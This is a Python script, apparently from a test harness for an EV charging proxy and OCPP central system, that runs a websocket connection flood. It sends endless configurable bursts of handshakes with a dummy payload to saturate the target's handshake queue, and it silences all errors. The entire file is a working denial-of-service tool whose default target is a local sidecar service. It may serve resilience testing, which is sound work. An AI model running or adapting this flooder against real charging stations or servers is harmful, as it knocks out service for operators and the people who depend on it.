import asyncio
import websockets
import logging
import time
import os

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("Attacker")

class ConnectionSpammer:
    """
    Simulates a coordinated Denial of Service (DoS) attack on the EVSE-Proxy-CSMS chain.
    """
    def __init__(self, target_url, burst_size=100, delay=0.01):
        self.target_url = target_url
        self.burst_size = burst_size
        self.delay = delay
        self.is_running = False

    async def spam_connection(self):
        """
        Sends a burst of connection requests to saturate the handshake queue.
        """
        while self.is_running:
            tasks = []
            for _ in range(self.burst_size):
                tasks.append(self._attempt_connection())
            
            await asyncio.gather(*tasks)
            await asyncio.sleep(self.delay)

    async def _attempt_connection(self):
        try:
            # We don't need to actually send OCPP data, just initiate handshakes
            async with websockets.connect(self.target_url) as ws:
                # Send a malformed or small packet to keep the connection open for a moment
                await ws.send("MALICIOUS_PAYLOAD_SPOOF")
                await asyncio.sleep(0.1)
        except Exception:
            # Silence connection errors during DoS
            pass

async def run_dos_attack():
    target = os.getenv("TARGET_URL", "ws://sidecar:9000")
    intensity = int(os.getenv("ATTACK_INTENSITY", "50"))
    
    logger.info(f"Targeting {target} with intensity {intensity}")
    spammer = ConnectionSpammer(target, burst_size=intensity)
    spammer.is_running = True
    await spammer.spam_connection()

if __name__ == "__main__":
    asyncio.run(run_dos_attack())
